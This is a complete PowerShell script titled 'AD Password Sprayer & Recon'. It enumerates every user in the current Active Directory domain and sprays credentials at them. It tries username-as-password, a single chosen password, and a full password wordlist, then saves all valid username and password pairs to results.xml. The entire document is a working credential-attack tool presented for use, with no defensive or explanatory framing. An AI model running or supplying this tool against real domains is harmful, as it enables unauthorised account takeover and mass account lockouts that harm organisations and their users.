Add-Type -AssemblyName System.DirectoryServices.AccountManagement
Add-Type -AssemblyName System.DirectoryServices.ActiveDirectory

Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "        AD Password Sprayer & Recon       " -ForegroundColor Cyan
Write-Host "==========================================" -ForegroundColor Cyan

$ValidCreds = New-Object System.Collections.ArrayList

Write-Host "`n[*] Identifying current domain..."
try {
    $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
    $Domain | Out-File -FilePath "domain.txt" -Encoding UTF8
    Write-Host "[+] Domain found: $Domain (saved to domain.txt)" -ForegroundColor Green
} catch {
    Write-Host "[-] Could not identify domain. Are you running in a domain context?" -ForegroundColor Red
    exit
}

Write-Host "[*] Extracting all users from Active Directory..."
$Context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain, $Domain)
$UserPrincipal = New-Object System.DirectoryServices.AccountManagement.UserPrincipal($Context)
$Searcher = New-Object System.DirectoryServices.AccountManagement.PrincipalSearcher($UserPrincipal)

try {
    $AllUsers = $Searcher.FindAll() | Select-Object -ExpandProperty SamAccountName
    $AllUsers | Out-File -FilePath "users.txt" -Encoding UTF8
    Write-Host "[+] $($AllUsers.Count) users found (saved to users.txt)" -ForegroundColor Green
} catch {
    Write-Host "[-] Error during user extraction." -ForegroundColor Red
    exit
}

function Test-Login {
    param([string]$u, [string]$p)
    try {
        if ($Context.ValidateCredentials($u, $p)) {
            Write-Host "[+] SUCCESS! $u : $p" -ForegroundColor Green
            $Hit = [PSCustomObject]@{
                Username = $u
                Password = $p
            }
            [void]$ValidCreds.Add($Hit)
        }
    } catch {
        # Silent catch to prevent output spam
    }
}

$CheckUserEqPass = Read-Host "`n[?] Check 'Username = Password'? (y/n)"
if ($CheckUserEqPass -match "^[yY]") {
    Write-Host "[*] Testing User = Password..." -ForegroundColor Yellow
    foreach ($User in $AllUsers) { Test-Login $User $User }
}

do {
    $CheckAltPass = Read-Host "`n[?] Test an alternative password for all users? (y/n)"
    if ($CheckAltPass -match "^[yY]") {
        $AltPass = Read-Host "[>] Enter password to test"
        Write-Host "[*] Testing password '$AltPass' for all users..." -ForegroundColor Yellow
        foreach ($User in $AllUsers) { Test-Login $User $AltPass }
    }
} while ($CheckAltPass -match "^[yY]")

$CheckList = Read-Host "`n[?] Test a password wordlist? [CAUTION: Risk of Account Lockout!] (y/n)"
if ($CheckList -match "^[yY]") {
    $ListPath = Read-Host "[>] Enter path to wordlist (e.g., C:\temp\passwords.txt)"

    if (Test-Path $ListPath) {
        $Passwords = Get-Content -Path $ListPath
        Write-Host "[*] Loaded $($Passwords.Count) passwords. Starting spray..." -ForegroundColor Yellow

        foreach ($Pass in $Passwords) {
            Write-Host "[*] Testing password: $Pass" -ForegroundColor Cyan
            foreach ($User in $AllUsers) { Test-Login $User $Pass }
        }
    } else {
        Write-Host "[-] File not found: $ListPath" -ForegroundColor Red
    }
}

Write-Host "`n==========================================" -ForegroundColor Cyan
if ($ValidCreds.Count -gt 0) {
    Write-Host "[+] Total of $($ValidCreds.Count) valid credentials found!" -ForegroundColor Green

    $ValidCreds | ConvertTo-Xml -NoTypeInformation | Out-File -FilePath "results.xml" -Encoding UTF8
    Write-Host "[*] Results saved to 'results.xml'." -ForegroundColor Yellow
} else {
    Write-Host "[-] No matches found." -ForegroundColor DarkGray
}
Write-Host "==========================================" -ForegroundColor Cyan
